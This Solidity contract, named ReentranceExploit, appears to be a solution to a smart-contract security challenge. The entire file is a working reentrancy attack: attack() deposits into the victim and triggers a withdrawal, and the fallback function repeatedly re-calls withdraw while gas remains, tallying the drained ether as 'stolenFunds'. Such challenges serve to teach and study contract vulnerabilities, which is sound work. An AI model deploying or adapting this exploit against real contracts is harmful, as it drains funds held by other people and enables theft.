// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import "./Rentrancy.sol";

contract ReentranceExploit {

  Reentrance public victimContract;
  uint256 public stolenFunds;
  bool public hasDonated;
  
  // Payable so we can send funds to the contract on deployment
  constructor(address _targetAddress) payable {
      victimContract = Reentrance(payable(_targetAddress));
      hasDonated = false;
  }

  function attack() external {
      // Depoist eth to target if we haven't already
      if(!hasDonated) {
          victimContract.donate{value: 1000000}(address(this));
      }

      // trigger first withdraw
      victimContract.withdraw(700000);
  }

  fallback() external payable {
      stolenFunds = stolenFunds + msg.value;

      if(gasleft() > 6000) {
          victimContract.withdraw(700000);
      }
  }
}